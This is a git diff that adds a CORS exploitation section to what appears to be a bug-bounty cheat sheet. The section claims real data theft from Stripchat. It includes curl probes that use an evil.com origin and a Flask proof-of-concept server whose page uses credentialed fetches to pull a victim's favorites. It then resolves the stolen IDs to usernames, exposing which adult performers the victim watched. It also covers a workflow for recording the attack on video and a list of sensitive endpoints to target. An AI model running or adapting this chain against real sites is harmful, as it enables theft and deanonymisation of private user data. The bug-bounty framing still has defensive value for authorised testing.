@@ -429,3 +429,178 @@ Full account data disclosure including API keys, allowing account takeover.
 | Corsy scan | `corsy -u URL` |
 | CORStest scan | `corstest -i urls.txt` |
 | Bulk scan | `corsy -i urls.txt -t 50 -o results.json` |
+
+---
+
+## Battle-Tested CORS Techniques (2026)
+
+**Proven on: Stripchat (13 favorites stolen, 6 usernames resolved, video PoC submitted)**
+
+These techniques were discovered and validated during real bug bounty hunts in April 2026. They go beyond basic CORS reflection testing into real-world exploitation chains.
+
+### 1. Retargeting Endpoint Exploitation
+
+Look for endpoints that store and echo back user data via URL parameters (e.g., `/r?action=add`). These "retargeting" or "tracking" endpoints often have permissive CORS because they are designed for cross-origin use by ad networks.
+
+```bash
+# Find retargeting/tracking endpoints
+curl -sk -H "Origin: https://evil.com" "https://target.com/r?action=add&item=123" \
+  | grep -i "access-control"
+
+# These endpoints often:
+# 1. Accept cross-origin requests (ACAO: * or reflected origin)
+# 2. Store user preferences/favorites/items server-side
+# 3. Echo back the stored data in the response
+# 4. Send cookies cross-origin (SameSite=None)
+
+# The attack: from attacker.com, call the retargeting endpoint with credentials
+# → it returns the victim's stored data (favorites, wishlist, viewed items)
+```
+
+### 2. Cookie-Based Cross-Origin Data Leakage (SameSite=None)
+
+When a site sets `SameSite=None` on session cookies (required for cross-site embeds, payment flows, or SSO), those cookies are sent on cross-origin requests. Combined with permissive CORS, this enables full data theft.
+
+```bash
+# Check cookie attributes
+curl -sk -D- "https://target.com/login" | grep -i "set-cookie"
+# Look for: SameSite=None; Secure
+
+# If SameSite=None AND CORS allows credentials from any origin:
+# → Any website can read authenticated responses
+```
+
+### 3. Model ID to Username Resolution Chain
+
+When you steal data cross-origin, you often get internal IDs (model IDs, user IDs) rather than human-readable info. Chain the CORS leak with public API endpoints that resolve IDs to usernames.
+
+```bash
+# Step 1: CORS leak gives you model/user IDs
+# Stolen data: {"favorites": [{"model_id": 12345}, {"model_id": 67890}]}
+
+# Step 2: Find a public API that resolves IDs to usernames
+curl -sk "https://target.com/api/public/user/12345" | jq '.username'
+# Or: https://target.com/api/profile/12345
+# Or: https://target.com/u/12345 (redirect to /u/username)
+
+# Step 3: Automate resolution
+for ID in 12345 67890 11111; do
+  NAME=$(curl -sk "https://target.com/api/public/user/$ID" | jq -r '.username')
+  echo "$ID -> $NAME"
+done
+```
+
+On Stripchat: stole 13 favorite model IDs via CORS, resolved 6 to usernames via public profile API. This turned an ID leak into a privacy violation (exposing which adult content users watched).
+
+### 4. VPS-Hosted PoC Server with Server-Side Resolution Proxy
+
+For maximum impact in your report, build a full PoC server that performs the attack end-to-end. Host it on a VPS so the reviewer can test it themselves.
+
+```python
+# poc_server.py — Host on your VPS
+from flask import Flask, request, jsonify
+import requests
+
+app = Flask(__name__)
+
+@app.route('/')
+def poc():
+    return '''
+    <html>
+    <head><title>CORS PoC</title></head>
+    <body>
+    <h2>CORS Data Theft PoC</h2>
+    <button onclick="steal()">Click to steal favorites</button>
+    <pre id="output"></pre>
+    <script>
+    async function steal() {
+        // Step 1: Steal favorites via CORS
+        let resp = await fetch('https://target.com/r?action=get_favorites', {
+            credentials: 'include'
+        });
+        let data = await resp.json();
+
+        // Step 2: Resolve IDs to usernames via our proxy
+        let resolved = await fetch('/resolve', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ids: data.favorites.map(f => f.model_id)})
+        });
+        let names = await resolved.json();
+
+        document.getElementById('output').innerText =
+            JSON.stringify(names, null, 2);
+    }
+    </script>
+    </body>
+    </html>
+    '''
+
+@app.route('/resolve', methods=['POST'])
+def resolve():
+    """Server-side username resolution to avoid CORS issues on public API"""
+    ids = request.json.get('ids', [])
+    results = []
+    for uid in ids:
+        r = requests.get(f'https://target.com/api/public/user/{uid}')
+        if r.ok:
+            results.append({'id': uid, 'username': r.json().get('username')})
+    return jsonify(results)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')
+```
+
+### 5. Video Recording PoC Workflow
+
+A video PoC is 10x more convincing than curl commands. Record the full attack flow.
+
+```bash
+# Workflow:
+# 1. Open browser logged into target.com (victim session)
+# 2. Start screen recording
+# 3. Show the victim's favorites/data on target.com (baseline)
+# 4. Navigate to your PoC page (attacker.com)
+# 5. Click the "steal" button
+# 6. Show the stolen data appearing on attacker.com
+# 7. Show the resolved usernames
+# 8. Stop recording
+
+# Use PoC Recorder agent for automated Playwright recording:
+# claudeos poc-recorder record --url https://your-vps/poc --steps steal_flow.json
+
+# Key: Show the FULL chain in one continuous video:
+# victim logged in → visit attacker page → data stolen → usernames resolved
+# No cuts, no edits — reviewers trust continuous recordings
+```
+
+### 6. CORS Testing Beyond /api/me
+
+Don't just test `/api/me` or `/api/user`. The most interesting CORS vulns are on endpoints nobody thinks to test:
+
+```bash
+# Retargeting / tracking endpoints
+/r?action=add
+/r?action=get
+/tracking/preferences
+/pixel/data
+
+# Favorites / wishlist / saved items
+/api/favorites
+/api/wishlist
+/api/saved
+/api/recently-viewed
+
+# Notification / message endpoints
+/api/notifications
+/api/messages/unread
+
+# Payment / billing
+/api/billing/methods
+/api/subscriptions
+
+# Social features
+/api/following
+/api/followers
+/api/blocked
+```
